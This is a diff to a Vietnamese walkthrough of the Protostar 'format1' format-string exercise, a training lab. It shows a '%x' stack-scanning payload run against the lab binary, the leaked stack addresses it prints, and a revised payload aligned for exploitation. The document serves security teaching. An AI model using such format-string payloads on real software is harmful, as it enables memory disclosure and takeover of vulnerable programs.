@@ -46,7 +46,7 @@ root@protostar:/opt/protostar/bin# ./format1 $(python -c 'print "ABCDEFGH" + ".%
 ABCDEFGH.804960c.bffffb38.8048469.b7fd8304.b7fd7ff4.bffffb38.8048435.bffffd08.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbb8.b7eadc76.2.bffffbe4.bffffbf0.b7fe1848.bffffba0.ffffffff.b7ffeff4.804824d.1.bffffba0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbb8.6df3930f.47bd651f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffbe4.8048450.8048440.b7ff1040.bffffbdc.b7fff8f8.2.bffffcfe.bffffd08.0.bffffea6.bffffeba.bffffeca.bffffeec.bffffeff.bfffff09.bfffff1d.bfffff5f.bfffff76.bfffff87.bfffff8f.bfffff9a.bfffffa7.bfffffdd.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffcdb.1f.bffffff2.f.bffffceb.0.0.0.0.f000000.897af4f1.9384902.1e7fa30d.6995b4d0.363836.0.0.0.2f2e0000.6d726f66.317461.44434241.48474645.2e78252e.252e7825.78252e78.2e78252e
 ```
 
-"ABCD" được định dạng ở parameter thứ 130, ta sẽ căn chỉnh lại payload quét stack để dễ sửa đổi thành payload khai thác của chúng ta.
+"ABCD" được định dạng ở parameter thứ 130 - tôi đã viết một chương trình C nhỏ để đếm dấu "." :), ta sẽ căn chỉnh lại payload quét stack để dễ sửa đổi thành payload khai thác của chúng ta.
 
 ```
 root@protostar:/opt/protostar/bin# ./format1 $(python -c 'print "ABCDEFGH" + ".%x" * 129 + ".%x" + ".%x" * 5')
